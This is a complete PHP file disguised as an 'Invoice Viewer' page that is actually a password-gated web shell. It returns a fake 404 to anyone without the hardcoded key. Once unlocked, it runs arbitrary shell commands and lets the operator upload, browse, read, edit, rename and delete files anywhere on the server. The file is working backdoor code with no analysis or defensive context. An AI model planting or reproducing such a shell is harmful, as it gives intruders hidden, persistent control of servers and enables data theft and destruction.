 <?php
@ini_set('display_errors', 0);
@error_reporting(0);
$auth = 'aksesgw';
if ($_GET['auth'] !== $auth) {
    http_response_code(404);
    exit("Not Found");
}
session_start();
$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($cwd);
$cwd = getcwd();

function h($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['upload']) && isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $cwd.'/'.$_FILES['file']['name']);
    }
    if (isset($_POST['mkdir']) && !empty($_POST['foldername'])) {
        mkdir($cwd.'/'.$_POST['foldername']);
    }
    if (isset($_POST['newfile']) && !empty($_POST['filename'])) {
        file_put_contents($cwd.'/'.$_POST['filename'], '');
    }
    if (isset($_POST['savefile']) && isset($_POST['filepath'])) {
        file_put_contents($_POST['filepath'], $_POST['filecontent']);
    }
    if (isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'])) {
        rename($cwd.'/'.$_POST['oldname'], $cwd.'/'.$_POST['newname']);
    }
    if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
        $_SESSION['last_cmd'] = shell_exec($_POST['cmd']);
    }
    header("Location: ?auth=$auth&path=" . urlencode($cwd));
    exit;
}
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    is_dir($target) ? rmdir($target) : unlink($target);
    header("Location: ?auth=$auth&path=" . urlencode($cwd));
    exit;
}

// Start HTML
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Invoice Viewer</title>
<style>
body{font-family:sans-serif;background:#f4f4f4;padding:20px;}
h2{margin-top:0}
table{width:100%;border-collapse:collapse;background:#fff;}
td,th{border:1px solid #ccc;padding:8px;text-align:left}
form.inline{display:inline}
input[type=text]{padding:4px}
textarea{width:100%;height:300px}
.btn{padding:5px 10px;margin:3px}
pre{background:#000;color:#0f0;padding:10px;overflow:auto}
</style></head><body>";

echo "<h2>📁 Current Path: $cwd</h2>";

// Terminal
echo "<h3>💻 Terminal</h3>
<form method='POST'>
<input type='text' name='cmd' placeholder='Command...' style='width:80%'/>
<input type='submit' value='Run' class='btn' />
</form>";
if (isset($_SESSION['last_cmd'])) {
    echo "<pre>" . h($_SESSION['last_cmd']) . "</pre>";
}

// Upload & File/Folder Creation
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file' name='file' />
<input type='submit' name='upload' value='Upload' class='btn' />
</form>";

echo "<form method='POST'>
<input type='text' name='foldername' placeholder='New Folder' />
<input type='submit' name='mkdir' value='Create Folder' class='btn' />
</form>";

echo "<form method='POST'>
<input type='text' name='filename' placeholder='New File.txt' />
<input type='submit' name='newfile' value='Create File' class='btn' />
</form>";

// List Files
echo "<table><tr><th>Name</th><th>Size</th><th>Action</th></tr>";
foreach(scandir($cwd) as $f){
    if($f === '.') continue;
    $full = $cwd . '/' . $f;
    $is_dir = is_dir($full);
    $size = $is_dir ? '-' : filesize($full);
    echo "<tr>";
    echo "<td>" . ($is_dir ? "📁 " : "📄 ") . "<a href='?auth=$auth&path=" . urlencode(realpath($full)) . "'>" . h($f) . "</a></td>";
    echo "<td>$size</td><td>";
    echo "<form method='GET' class='inline'><input type='hidden' name='auth' value='$auth'><input type='hidden' name='delete' value='".h($full)."'><input type='submit' value='🗑️ Delete' class='btn'></form> ";
    if (!$is_dir) {
        echo "<form method='GET' class='inline'><input type='hidden' name='auth' value='$auth'><input type='hidden' name='edit' value='".h($full)."'><input type='submit' value='✏️ Edit' class='btn'></form> ";
    }
    echo "<form method='POST' class='inline'>
        <input type='hidden' name='oldname' value='".h($f)."' />
        <input type='text' name='newname' value='".h($f)."' />
        <input type='submit' name='rename' value='Rename' class='btn' />
    </form>";
    echo "</td></tr>";
}
echo "</table>";
// Edit File
if (isset($_GET['edit'])) {
    $editf = $_GET['edit'];
    echo "<h2>Edit: $editf</h2>
    <form method='POST'>
    <input type='hidden' name='filepath' value='".h($editf)."' />
    <textarea name='filecontent'>" . h(file_get_contents($editf)) . "</textarea><br/>
    <input type='submit' name='savefile' value='💾 Save' class='btn' />
    </form>";
}

echo "</body></html>";
?>
